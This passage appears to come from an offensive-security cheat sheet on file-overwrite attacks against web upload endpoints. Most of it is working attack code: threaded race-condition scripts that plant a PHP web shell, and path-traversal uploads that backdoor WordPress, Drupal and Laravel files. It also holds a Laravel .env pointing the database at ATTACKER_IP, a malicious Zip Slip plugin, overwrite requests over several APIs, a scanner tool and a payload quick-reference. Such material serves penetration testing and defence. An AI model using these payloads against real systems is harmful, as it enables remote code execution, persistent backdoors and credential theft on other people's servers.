# Window: Between check and rename, the original filename briefly exists

# Rapid upload loop to hit the race window
for i in $(seq 1 1000); do
  curl -s -o /dev/null -F "file=@shell.php;filename=../index.php" https://target.com/upload &
done
wait

# Check if any overwrites succeeded
curl -s "https://target.com/index.php?cmd=id"

# Python threaded race condition exploit
python3 << 'PYEOF'
import requests
import threading
import time

target = "https://target.com/upload"
payload = '<?php system($_GET["cmd"]); ?>'
success = False

def upload():
    global success
    try:
        files = {'file': ('../index.php', payload, 'image/jpeg')}
        r = requests.post(target, files=files, verify=False, timeout=5)
        if r.status_code == 200:
            check = requests.get('https://target.com/index.php?cmd=id', verify=False, timeout=5)
            if 'uid=' in check.text:
                success = True
                print(f'[+] RACE WON! RCE confirmed!')
    except:
        pass

print('[*] Starting race condition exploit...')
for batch in range(100):
    threads = []
    for _ in range(20):
        t = threading.Thread(target=upload)
        threads.append(t)
        t.start()
    for t in threads:
        t.join(timeout=10)
    if success:
        break
    print(f'[*] Batch {batch+1}/100 complete')

if not success:
    print('[-] Race condition not exploitable within attempts')
PYEOF
```

```bash [Temporary File Overwrite]
# Exploit: Server writes upload to temp location then moves
# If temp path is predictable, overwrite temp file before move

# Predict temp filenames
# PHP: /tmp/phpXXXXXX (6 random chars)
# Python: /tmp/tmpXXXXXXXX
# Node: OS temp dir

# Spray temporary file overwrites
python3 << 'PYEOF'
import requests
import threading
import string
import itertools

target = "https://target.com/upload"
payload = '<?php system($_GET["cmd"]); ?>'

def overwrite_temp(name):
    try:
        files = {'file': (f'/tmp/{name}', payload, 'image/jpeg')}
        requests.post(target, files=files, verify=False, timeout=3)
    except:
        pass

# Generate possible PHP temp names
chars = string.ascii_letters + string.digits
for combo in itertools.product(chars, repeat=3):
    name = 'php' + ''.join(combo) + 'tmp'
    t = threading.Thread(target=overwrite_temp, args=(name,))
    t.start()
PYEOF

# Simultaneous legitimate upload + overwrite attempt
# Terminal 1: Continuously upload legitimate file
while true; do curl -s -F "file=@clean.jpg" https://target.com/upload > /dev/null; done

# Terminal 2: Continuously attempt to overwrite
while true; do curl -s -F "file=@shell.php;filename=../clean.jpg" https://target.com/upload > /dev/null; done
```

```bash [Antivirus Scan Race]
# Exploit: Server uploads file → AV scans → moves to final location
# Window: File exists in temp with original name during scan

# If scan takes time, overwrite the file after upload but before scan completes
python3 << 'PYEOF'
import requests
import threading
import time

target_upload = "https://target.com/upload"
target_overwrite = "https://target.com/upload"
clean_file = open('clean.jpg', 'rb').read()
shell = b'<?php system($_GET["cmd"]); ?>'

def upload_clean():
    """Upload clean file that passes AV"""
    files = {'file': ('clean.jpg', clean_file, 'image/jpeg')}
    requests.post(target_upload, files=files, verify=False, timeout=10)

def overwrite_with_shell():
    """Immediately overwrite with shell"""
    time.sleep(0.01)  # Small delay
    files = {'file': ('clean.jpg', shell, 'image/jpeg')}
    requests.post(target_overwrite, files=files, verify=False, timeout=10)

for attempt in range(500):
    t1 = threading.Thread(target=upload_clean)
    t2 = threading.Thread(target=overwrite_with_shell)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    
    # Check if shell landed
    r = requests.get('https://target.com/uploads/clean.jpg?cmd=id', verify=False, timeout=5)
    if 'uid=' in r.text:
        print(f'[+] Race won on attempt {attempt}!')
        break

    if attempt % 50 == 0:
        print(f'[*] Attempt {attempt}/500...')
PYEOF
```
::

---

## API & CMS-Specific Overwrite

::accordion
  :::accordion-item{icon="i-lucide-globe" label="WordPress Overwrite Attacks"}
  ```bash [Terminal]
  # WordPress has multiple file write vectors

  # Overwrite wp-config.php (requires path traversal)
  cat > wp-config.php << 'EOF'
  <?php
  if(isset($_GET['cmd'])){system($_GET['cmd']);die();}
  define('DB_NAME', 'wordpress');
  define('DB_USER', 'root');
  define('DB_PASSWORD', '');
  define('DB_HOST', 'localhost');
  $table_prefix = 'wp_';
  define('ABSPATH', dirname(__FILE__) . '/');
  require_once(ABSPATH . 'wp-settings.php');
  EOF
  curl -F "file=@wp-config.php;filename=../wp-config.php" https://target.com/wp-content/upload

  # Overwrite plugin files
  curl -F "file=@shell.php;filename=../../plugins/akismet/akismet.php" https://target.com/wp-content/upload
  curl -F "file=@shell.php;filename=../../plugins/hello.php" https://target.com/wp-content/upload

  # Overwrite theme functions.php
  curl -F "file=@functions.php;filename=../../themes/twentytwentythree/functions.php" https://target.com/wp-content/upload

  # Overwrite wp-includes core files
  curl -F "file=@shell.php;filename=../../wp-includes/version.php" https://target.com/wp-content/upload
  curl -F "file=@shell.php;filename=../../wp-includes/pluggable.php" https://target.com/wp-content/upload

  # Theme Editor API (if authenticated as admin)
  curl -X POST "https://target.com/wp-admin/theme-editor.php" \
    -b "wordpress_logged_in_xxx=admin_cookie" \
    -d "newcontent=<?php+system(\$_GET['cmd']);+?>&file=functions.php&theme=twentytwentythree&action=update&nonce=xxx"

  # Plugin upload to overwrite (ZIP with traversal)
  python3 -c "
  import zipfile
  with zipfile.ZipFile('evil_plugin.zip','w') as z:
      z.writestr('../../../wp-config.php','<?php system(\$_GET[\"cmd\"]); ?>')
      z.writestr('evil/evil.php','<?php /* Plugin Name: Evil */ system(\$_GET[\"cmd\"]); ?>')
  "
  curl -F "pluginzip=@evil_plugin.zip" -b "cookies.txt" "https://target.com/wp-admin/update.php?action=upload-plugin"
  ```
  :::

  :::accordion-item{icon="i-lucide-globe" label="Drupal Overwrite Attacks"}
  ```bash [Terminal]
  # Drupal file overwrite vectors

  # Overwrite settings.php
  cat > settings.php << 'EOF'
  <?php
  if(isset($_GET['cmd'])){system($_GET['cmd']);die();}
  $databases['default']['default'] = array(
    'database' => 'drupal',
    'username' => 'root',
    'password' => '',
    'host' => 'localhost',
    'driver' => 'mysql',
  );
  $settings['hash_salt'] = 'attacker_controlled_salt';
  EOF

  curl -F "file=@settings.php;filename=../../sites/default/settings.php" https://target.com/upload

  # Overwrite .htaccess in files directory
  cat > .htaccess << 'EOF'
  SetHandler application/x-httpd-php
  EOF
  curl -F "file=@.htaccess;filename=.htaccess" https://target.com/sites/default/files/upload

  # Overwrite module files
  curl -F "file=@shell.php;filename=../../modules/system/system.module" https://target.com/upload
  ```
  :::

  :::accordion-item{icon="i-lucide-globe" label="Laravel Overwrite Attacks"}
  ```bash [Terminal]
  # Laravel-specific overwrite targets

  # Overwrite .env (most impactful)
  cat > .env << 'EOF'
  APP_NAME=Laravel
  APP_ENV=local
  APP_KEY=base64:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
  APP_DEBUG=true
  DB_CONNECTION=mysql
  DB_HOST=ATTACKER_IP
  DB_PORT=3306
  DB_DATABASE=exfil
  DB_USERNAME=root
  DB_PASSWORD=
  EOF

  curl -F "file=@.env;filename=../../.env" https://target.com/upload

  # Overwrite routes/web.php
  cat > web.php << 'EOF'
  <?php
  use Illuminate\Support\Facades\Route;
  Route::get('/cmd', function() {
      return '<pre>' . shell_exec(request('cmd')) . '</pre>';
  });
  Route::get('/', function() { return view('welcome'); });
  EOF

  curl -F "file=@web.php;filename=../../routes/web.php" https://target.com/upload
  curl "https://target.com/cmd?cmd=id"

  # Overwrite compiled config cache
  curl -F "file=@evil_config.php;filename=../../bootstrap/cache/config.php" https://target.com/upload

  # Overwrite compiled routes cache
  curl -F "file=@evil_routes.php;filename=../../bootstrap/cache/routes-v7.php" https://target.com/upload

  # Overwrite storage logs for log poisoning
  echo '<?php system($_GET["cmd"]); ?>' > laravel.log
  curl -F "file=@laravel.log;filename=../../storage/logs/laravel.log" https://target.com/upload

  # If LFI exists: include poisoned log
  curl "https://target.com/?page=../storage/logs/laravel.log&cmd=id"
  ```
  :::

  :::accordion-item{icon="i-lucide-globe" label="REST API File Overwrite"}
  ```bash [Terminal]
  # API endpoints that accept file paths or names

  # PUT-based file write APIs
  curl -X PUT "https://target.com/api/files/.htaccess" \
    -H "Content-Type: text/plain" \
    -d "AddType application/x-httpd-php .jpg"

  curl -X PUT "https://target.com/api/files/../index.php" \
    -H "Content-Type: application/x-php" \
    -d '<?php system($_GET["cmd"]); ?>'

  # PATCH-based content update
  curl -X PATCH "https://target.com/api/files/config.php" \
    -H "Content-Type: application/json" \
    -d '{"content": "<?php system($_GET[\"cmd\"]); ?>"}'

  # GraphQL file mutation
  curl -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"mutation { updateFile(path: \"../.htaccess\", content: \"AddType application/x-httpd-php .jpg\") { success } }"}'

  # S3-compatible API overwrite
  curl -X PUT "https://target.com/api/s3/bucket/../.htaccess" \
    -H "Content-Type: text/plain" \
    -d "AddType application/x-httpd-php .jpg"

  # WebDAV COPY/MOVE overwrite
  curl -X COPY "https://target.com/uploads/shell.txt" \
    -H "Destination: /index.php" \
    -H "Overwrite: T"

  curl -X MOVE "https://target.com/uploads/shell.txt" \
    -H "Destination: /.htaccess" \
    -H "Overwrite: T"
  ```
  :::
::

---

## Automated Overwrite Scanner

::code-collapse

```python [overwrite_scanner.py]
#!/usr/bin/env python3
"""
File Overwrite Attack Scanner
Tests upload endpoints for filename preservation, path traversal,
and critical file overwrite vulnerabilities.
"""
import requests
import argparse
import time
import hashlib
import random
import string
import urllib3
urllib3.disable_warnings()

class OverwriteScanner:
    def __init__(self, upload_url, base_url, field='file', proxy=None):
        self.upload_url = upload_url
        self.base_url = base_url.rstrip('/')
        self.field = field
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.results = []
        self.marker = ''.join(random.choices(string.ascii_lowercase, k=16))

    def upload(self, filename, content, content_type='text/plain'):
        """Upload file with specified filename"""
        try:
            body = (
                '--BOUND\r\n'
                f'Content-Disposition: form-data; name="{self.field}"; filename="{filename}"\r\n'
                f'Content-Type: {content_type}\r\n'
                '\r\n'
                f'{content}\r\n'
                '--BOUND--\r\n'
            )
            r = self.session.post(self.upload_url,
                headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
                data=body.encode('latin-1'), timeout=15)
            return r
        except Exception as e:
            return None

    def check_url(self, path):
        """Check if content at URL contains our marker"""
        try:
            url = f"{self.base_url}/{path.lstrip('/')}"
            r = self.session.get(url, timeout=10)
            return self.marker in r.text, r.status_code, len(r.text)
        except:
            return False, 0, 0

    def test_filename_preservation(self):
        """Test if server preserves uploaded filename"""
        print("\n[*] Testing filename preservation...")
        test_name = f"overwrite_test_{self.marker}.txt"
        content = f"MARKER_{self.marker}"

        r = self.upload(test_name, content)
        if r and r.status_code in [200, 201, 302]:
            # Try common upload directories
            paths = [
                f"uploads/{test_name}", f"upload/{test_name}",
                f"files/{test_name}", f"media/{test_name}",
                f"static/uploads/{test_name}", f"public/uploads/{test_name}",
                f"wp-content/uploads/{test_name}", f"assets/{test_name}",
                test_name,
            ]
            for path in paths:
                found, status, length = self.check_url(path)
                if found:
                    print(f"  [FOUND] Filename preserved at: {path}")
                    self.results.append({
                        'test': 'filename_preservation',
                        'path': path, 'success': True
                    })
                    return path.replace(test_name, '')
        print("  [-] Filename not preserved or upload directory not found")
        return None

    def test_overwrite_capability(self, upload_dir):
        """Test if files can be overwritten"""
        print("\n[*] Testing overwrite capability...")
        test_name = f"overwrite_check_{self.marker}.txt"
        path = f"{upload_dir}{test_name}"

        # Upload version 1
        self.upload(test_name, f"VERSION_1_{self.marker}")
        found1, _, _ = self.check_url(path)

        # Upload version 2 (overwrite)
        marker2 = self.marker + "_v2"
        self.upload(test_name, f"VERSION_2_{marker2}")
        
        try:
            r = self.session.get(f"{self.base_url}/{path}", timeout=10)
            if marker2 in r.text:
                print(f"  [VULN] File overwrite confirmed at {path}")
                self.results.append({'test': 'overwrite', 'success': True})
                return True
            elif self.marker in r.text:
                print(f"  [-] Original file preserved (no overwrite)")
                return False
        except:
            pass
        return False

    def test_traversal_overwrite(self, upload_dir):
        """Test path traversal for overwriting files outside upload dir"""
        print("\n[*] Testing path traversal overwrite...")
        traversals = [
            ("../", "Parent directory"),
            ("../../", "Two levels up"),
            ("../../../", "Three levels up"),
            ("..%2f", "URL-encoded slash"),
            ("..%252f", "Double URL-encoded"),
            ("%2e%2e/", "URL-encoded dots"),
            ("....//", "Nested bypass"),
            ("..\\", "Backslash traversal"),
            ("..%5c", "URL-encoded backslash"),
            ("..;/", "Semicolon bypass"),
        ]

        test_content = f"TRAVERSAL_MARKER_{self.marker}"

        for trav, label in traversals:
            filename = f"{trav}traversal_test_{self.marker}.txt"
            r = self.upload(filename, test_content)
            if r and r.status_code in [200, 201, 302]:
                # Check if file landed outside upload dir
                check_path = f"traversal_test_{self.marker}.txt"
                found, status, _ = self.check_url(check_path)
                if found:
                    print(f"  [VULN] Traversal works: {label} ({trav})")
                    self.results.append({
                        'test': 'traversal', 'payload': trav,
                        'label': label, 'success': True
                    })
                else:
                    print(f"  [-] {label}: uploaded but not found at expected path")
            else:
                status = r.status_code if r else 'ERR'
                print(f"  [-] {label}: HTTP {status}")

    def test_config_overwrite(self):
        """Test overwriting configuration files"""
        print("\n[*] Testing configuration file overwrite...")
        
        configs = {
            '.htaccess': 'AddType application/x-httpd-php .jpg\n',
            '.user.ini': f'auto_prepend_file=marker_{self.marker}.txt\n',
            'web.config': '<?xml version="1.0"?><configuration></configuration>',
        }

        traversal_depths = ['../', '../../', '../../../', '../../../../']

        for config_name, config_content in configs.items():
            for depth in traversal_depths:
                filename = f"{depth}{config_name}"
                r = self.upload(filename, config_content)
                if r and r.status_code in [200, 201, 302]:
                    # Verify by checking if config affects behavior
                    found, status, _ = self.check_url(config_name)
                    if status != 404:
                        print(f"  [POTENTIAL] {filename} → HTTP {status}")
                        self.results.append({
                            'test': 'config_overwrite',
                            'file': config_name, 'depth': depth,
                            'success': True
                        })

    def test_source_overwrite(self):
        """Test overwriting source code files"""
        print("\n[*] Testing source code overwrite...")
        
        shell_content = f'SHELL_MARKER_{self.marker}'
        source_files = [
            'index.php', 'index.html', 'default.asp', 'default.aspx',
            'app.py', 'app.js', 'server.js', 'main.py',
        ]

        traversal_depths = ['../', '../../', '../../../']

        for src in source_files:
            for depth in traversal_depths:
                filename = f"{depth}{src}"
                r = self.upload(filename, shell_content)
                if r and r.status_code in [200, 201, 302]:
                    found, status, _ = self.check_url(src)
                    if found:
                        print(f"  [CRITICAL] Source overwrite confirmed: {filename}")
                        self.results.append({
                            'test': 'source_overwrite',
                            'file': src, 'depth': depth,
                            'success': True
                        })
                    elif status == 200:
                        print(f"  [CHECK] {filename} → HTTP {status} (verify manually)")

    def test_zip_slip(self):
        """Test ZIP/TAR extraction path traversal"""
        print("\n[*] Testing Zip Slip overwrite...")
        import zipfile
        import io

        marker_content = f'ZIPSLIP_MARKER_{self.marker}'

        # Create ZIP with traversal entries
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            zf.writestr(f'../../zipslip_test_{self.marker}.txt', marker_content)
            zf.writestr('normal.txt', 'Normal file')
        zip_buffer.seek(0)

        try:
            files = {self.field: ('test.zip', zip_buffer.read(), 'application/zip')}
            r = self.session.post(self.upload_url, files=files, timeout=15)
            
            if r and r.status_code in [200, 201, 302]:
                # Check if extracted file landed outside upload dir
                found, status, _ = self.check_url(f'zipslip_test_{self.marker}.txt')
                if found:
                    print(f"  [CRITICAL] Zip Slip confirmed!")
                    self.results.append({'test': 'zip_slip', 'success': True})
                else:
                    print(f"  [-] ZIP uploaded but traversal not confirmed")
            else:
                print(f"  [-] ZIP upload: HTTP {r.status_code if r else 'ERR'}")
        except Exception as e:
            print(f"  [-] ZIP test error: {e}")

    def run_all(self):
        """Execute full scan"""
        print(f"\n{'='*70}")
        print(f"  File Overwrite Scanner")
        print(f"  Upload: {self.upload_url}")
        print(f"  Base:   {self.base_url}")
        print(f"  Marker: {self.marker}")
        print(f"{'='*70}")

        upload_dir = self.test_filename_preservation()
        
        if upload_dir:
            self.test_overwrite_capability(upload_dir)
        
        self.test_traversal_overwrite(upload_dir or '')
        self.test_config_overwrite()
        self.test_source_overwrite()
        self.test_zip_slip()

        print(f"\n{'='*70}")
        print(f"  RESULTS SUMMARY")
        print(f"{'='*70}")
        vulns = [r for r in self.results if r.get('success')]
        print(f"  Total tests:    {len(self.results)}")
        print(f"  Vulnerabilities: {len(vulns)}")
        if vulns:
            print(f"\n  Findings:")
            for v in vulns:
                print(f"    - [{v['test']}] {v}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='File Overwrite Scanner')
    parser.add_argument('-u', '--upload-url', required=True, help='Upload endpoint')
    parser.add_argument('-b', '--base-url', required=True, help='Application base URL')
    parser.add_argument('-f', '--field', default='file', help='Form field name')
    parser.add_argument('-p', '--proxy', default=None, help='Proxy URL')
    parser.add_argument('--test', choices=[
        'preserve', 'overwrite', 'traversal', 'config', 'source', 'zipslip', 'all'
    ], default='all')
    args = parser.parse_args()

    scanner = OverwriteScanner(args.upload_url, args.base_url, args.field, args.proxy)
    
    if args.test == 'all':
        scanner.run_all()
    else:
        upload_dir = scanner.test_filename_preservation() or ''
        tests = {
            'preserve': scanner.test_filename_preservation,
            'overwrite': lambda: scanner.test_overwrite_capability(upload_dir),
            'traversal': lambda: scanner.test_traversal_overwrite(upload_dir),
            'config': scanner.test_config_overwrite,
            'source': scanner.test_source_overwrite,
            'zipslip': scanner.test_zip_slip,
        }
        tests[args.test]()
```

::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Scanner Usage"}
  ```bash [Terminal]
  # Full scan
  python3 overwrite_scanner.py -u https://target.com/upload -b https://target.com --test all

  # Test only path traversal
  python3 overwrite_scanner.py -u https://target.com/upload -b https://target.com --test traversal

  # Test config file overwrite
  python3 overwrite_scanner.py -u https://target.com/upload -b https://target.com --test config

  # Test Zip Slip
  python3 overwrite_scanner.py -u https://target.com/upload -b https://target.com --test zipslip

  # With Burp proxy
  python3 overwrite_scanner.py -u https://target.com/upload -b https://target.com -p http://127.0.0.1:8080

  # Custom field name
  python3 overwrite_scanner.py -u https://target.com/api/avatar -b https://target.com -f avatar
  ```
  :::

  :::tabs-item{icon="i-lucide-list" label="Manual Quick Tests"}
  ```bash [Terminal]
  # Quick overwrite test suite
  echo "OVERWRITE_TEST_V1" > test_overwrite.txt
  curl -F "file=@test_overwrite.txt" https://target.com/upload
  curl -s "https://target.com/uploads/test_overwrite.txt"

  echo "OVERWRITE_TEST_V2" > test_overwrite.txt
  curl -F "file=@test_overwrite.txt" https://target.com/upload
  curl -s "https://target.com/uploads/test_overwrite.txt"
  # If V2 shows → overwrite confirmed

  # Quick traversal test
  for depth in "../" "../../" "../../../" "../../../../"; do
    echo -n "Traversal ${depth}: "
    curl -s -o /dev/null -w "%{http_code}" \
      -F "file=@test_overwrite.txt;filename=${depth}traversal_probe.txt" \
      https://target.com/upload
    echo ""
  done

  # Quick config overwrite test
  echo "# Test" > .htaccess
  for depth in "" "../" "../../"; do
    echo -n ".htaccess at ${depth:-root}: "
    curl -s -o /dev/null -w "%{http_code}" \
      -F "file=@.htaccess;filename=${depth}.htaccess" \
      https://target.com/upload
    echo ""
  done
  ```
  :::
::

---

## Attack Flow Diagram

::code-collapse

```text [Overwrite Existing File Attack Flow]
┌──────────────────────────────────────────────────────────────────────┐
│                       RECONNAISSANCE                                 │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌─────────────────┐  ┌───────────────────┐  ┌───────────────────┐  │
│  │ Map File         │  │ Test Filename     │  │ Identify Server   │  │
│  │ Structure        │─▶│ Preservation      │─▶│ Technology        │  │
│  │ (gobuster/       │  │ & Overwrite       │  │ & Config Files    │  │
│  │  feroxbuster)    │  │ Behavior          │  │                   │  │
│  └─────────────────┘  └───────────────────┘  └────────┬──────────┘  │
│                                                        │             │
└────────────────────────────────────────────────────────┼─────────────┘
                                                         │
                              ┌───────────────────────────┘
                              │
                              ▼
┌──────────────────────────────────────────────────────────────────────┐
│                    FILENAME PRESERVED?                                │
├─────────────────────────────┬────────────────────────────────────────┤
│           YES               │              NO                        │
│                             │                                        │
│  ┌───────────────────────┐  │  ┌──────────────────────────────────┐  │
│  │ Direct overwrite      │  │  │ Try alternative controls:        │  │
│  │ possible via same     │  │  │ • Separate filename parameter    │  │
│  │ filename upload       │  │  │ • Path parameter in form         │  │
│  └───────────┬───────────┘  │  │ • JSON body filename field       │  │
│              │              │  │ • API path parameter              │  │
│              ▼              │  │ • ZIP/TAR extraction (Zip Slip)   │  │
│  ┌───────────────────────┐  │  └──────────────┬───────────────────┘  │
│  │ PATH TRAVERSAL?       │  │                 │                      │
│  ├───────────┬───────────┤  │                 │                      │
│  │   YES     │    NO     │  │                 │                      │
│  │           │           │  │                 │                      │
│  │  Reach    │  Limited  │  │                 │                      │
│  │  any file │  to upload│  │                 │                      │
│  │  on disk  │  dir only │  │                 │                      │
│  └─────┬─────┘─────┬─────┘  │                 │                      │
│        │           │        │                 │                      │
└────────┼───────────┼────────┼─────────────────┼──────────────────────┘
         │           │        │                 │
         ▼           ▼        │                 │
┌────────────────────────────────────────────────────────────────────┐
│                   OVERWRITE TARGET SELECTION                       │
├────────────────────────────────────────────────────────────────────┤
│                                                                    │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │                  HIGH-IMPACT TARGETS                         │  │
│  ├──────────────────────────────────────────────────────────────┤  │
│  │                                                              │  │
│  │  CONFIG FILES            SOURCE CODE             DEPS        │  │
│  │  ┌───────────────┐      ┌───────────────┐   ┌──────────┐   │  │
│  │  │ .htaccess     │      │ index.php     │   │ autoload │   │  │
│  │  │ web.config    │      │ app.py        │   │ .php     │   │  │
│  │  │ .user.ini     │      │ server.js     │   │ node_    │   │  │
│  │  │ .env          │      │ views.py      │   │ modules/ │   │  │
│  │  │ nginx.conf    │      │ routes.rb     │   │ vendor/  │   │  │
│  │  │ php.ini       │      │ wsgi.py       │   │ gems/    │   │  │
│  │  └───────────────┘      └───────────────┘   └──────────┘   │  │
│  │                                                              │  │
│  │  AUTH FILES              TEMPLATES           CRON/TASKS      │  │
│  │  ┌───────────────┐      ┌───────────────┐   ┌──────────┐   │  │
│  │  │ .htpasswd     │      │ index.html    │   │ crontab  │   │  │
│  │  │ wp-config.php │      │ error.ejs     │   │ cron.d/  │   │  │
│  │  │ settings.py   │      │ base.twig     │   │ systemd  │   │  │
│  │  │ authorized_   │      │ layout.pug    │   │ services │   │  │
│  │  │   keys        │      │ 404.php       │   │          │   │  │
│  │  └───────────────┘      └───────────────┘   └──────────┘   │  │
│  │                                                              │  │
│  │  STATIC ASSETS                                               │  │
│  │  ┌───────────────────────────────────────────────────────┐   │  │
│  │  │ app.js / main.js / jquery.min.js / styles.css         │   │  │
│  │  │ (Stored XSS affecting all visitors)                    │   │  │
│  │  └───────────────────────────────────────────────────────┘   │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                              │                                     │
└──────────────────────────────┼─────────────────────────────────────┘
                               │
                               ▼
┌──────────────────────────────────────────────────────────────────┐
│                      IMPACT                                      ��
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  CONFIG OVERWRITE          SOURCE OVERWRITE       STATIC ASSETS  │
│  ┌──────────────────┐     ┌──────────────────┐  ┌────────────┐  │
│  │ Enable PHP exec  │     │ Direct webshell  │  │ Stored XSS │  │
│  │ in upload dir    │     │ on next request  │  │ all users  │  │
│  │ Disable security │     │ Auth bypass      │  │ Credential │  │
│  │ Change handlers  │     │ Backdoor in      │  │ theft      │  │
│  │ Redirect traffic │     │ every request    │  │ Session    │  │
│  │ Expose source    │     │                  │  │ hijacking  │  │
│  └────────┬─────────┘     └────────┬─────────┘  └─────┬──────┘  │
│           │                        │                    │        │
│           └────────────────────────┼────────────────────┘        │
│                                    │                             │
│                                    ▼                             │
│                       ┌──────────────────────┐                   │
│                       │   CODE EXECUTION     │                   │
│                       │   + PERSISTENCE      │                   │
│                       └──────────────────────┘                   │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

::

---

## Overwrite Target Reference

::collapsible

| Target File | Server | Impact | Traversal Depth | Payload Type |
|-------------|--------|--------|:-:|---|
| `.htaccess` | Apache | Handler mapping, PHP execution | 1-3 levels | `AddType application/x-httpd-php .jpg` |
| `web.config` | IIS | Handler mapping, ASPX execution | 1-3 levels | XML with handler definitions |
| `.user.ini` | PHP-FPM | Auto-prepend shell, disable security | 0-2 levels | `auto_prepend_file=shell.jpg` |
| `.env` | Laravel/Node | Credential theft, key control | 1-3 levels | Environment variables |
| `index.php` | PHP | Direct webshell | 1-3 levels | PHP system/eval |
| `app.py` | Flask/Django | Direct webshell | 1-3 levels | Python subprocess |
| `server.js` | Node/Express | Direct webshell | 1-3 levels | child_process exec |
| `wp-config.php` | WordPress | DB creds, key control, RCE | 1-2 levels | PHP with DB config |
| `settings.py` | Django | Secret key, DB redirect | 2-4 levels | Python config |
| `web.xml` | Tomcat | Servlet mapping | 2-4 levels | XML servlet config |
| `autoload.php` | Composer | Every-request backdoor | 2-3 levels | PHP with original require |
| `views.py` | Django | Route-level RCE | 2-4 levels | Python with subprocess |
| `routes/web.php` | Laravel | New backdoor route | 2-3 levels | Laravel route definition |
| `functions.php` | WordPress | Theme-level RCE | 3-5 levels | PHP in theme |
| `.htpasswd` | Apache | Auth bypass | 1-3 levels | Attacker password hash |
| `authorized_keys` | SSH | Remote access | 4-6 levels | SSH public key |
| `crontab` | Linux | Scheduled RCE | 4-6 levels | Cron expression + command |
| `app.js` (static) | Any | Stored XSS | 1-3 levels | JavaScript payload |
| `styles.css` | Any | CSS injection/exfil | 1-3 levels | CSS with external URLs |
| `error.ejs` | Express | Error-triggered RCE | 2-4 levels | EJS with child_process |
| `nginx.conf` | Nginx | Server reconfiguration | 4-6 levels | Nginx config directives |
| `package.json` | Node | Supply chain, script injection | 1-3 levels | JSON with malicious scripts |
| `requirements.txt` | Python | Supply chain | 1-3 levels | Malicious package names |
| `Gemfile` | Ruby | Supply chain | 1-3 levels | Malicious gem sources |

::

---

## Quick Reference Cheat Sheet

::field-group
  ::field{name=".htaccess PHP Execution" type="payload"}
  `AddType application/x-httpd-php .jpg .png .gif`
  ::

  ::field{name=".htaccess Auto-Prepend" type="payload"}
  `php_value auto_prepend_file shell.jpg`
  ::

  ::field{name=".user.ini Backdoor" type="payload"}
  `auto_prepend_file=shell.jpg`
  ::

  ::field{name="web.config JPG-as-ASP" type="payload"}
  `<add name="jpg" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll"/>`
  ::

  ::field{name="Upload .htaccess" type="command"}
  `curl -F "file=@.htaccess;filename=.htaccess" https://target.com/upload`
  ::

  ::field{name="Traversal + Config" type="command"}
  `curl -F "file=@.htaccess;filename=../.htaccess" https://target.com/upload`
  ::

  ::field{name="Overwrite index.php" type="command"}
  `curl -F "file=@shell.php;filename=../../index.php" https://target.com/upload`
  ::

  ::field{name="Overwrite .env" type="command"}
  `curl -F "file=@.env;filename=../../.env" https://target.com/upload`
  ::

  ::field{name="Zip Slip" type="command"}
  `python3 -c "import zipfile;z=zipfile.ZipFile('slip.zip','w');z.writestr('../../shell.php','PAYLOAD')"`
  ::

  ::field{name="Overwrite Test" type="command"}
  Upload same filename twice with different content, check which version persists.
  ::

  ::field{name="Race Condition" type="command"}
  `for i in $(seq 1 1000); do curl -s -F "file=@shell.php;filename=../index.php" TARGET & done`
  ::

  ::field{name="Full Scanner" type="command"}
  `python3 overwrite_scanner.py -u https://target.com/upload -b https://target.com --test all`
  ::
::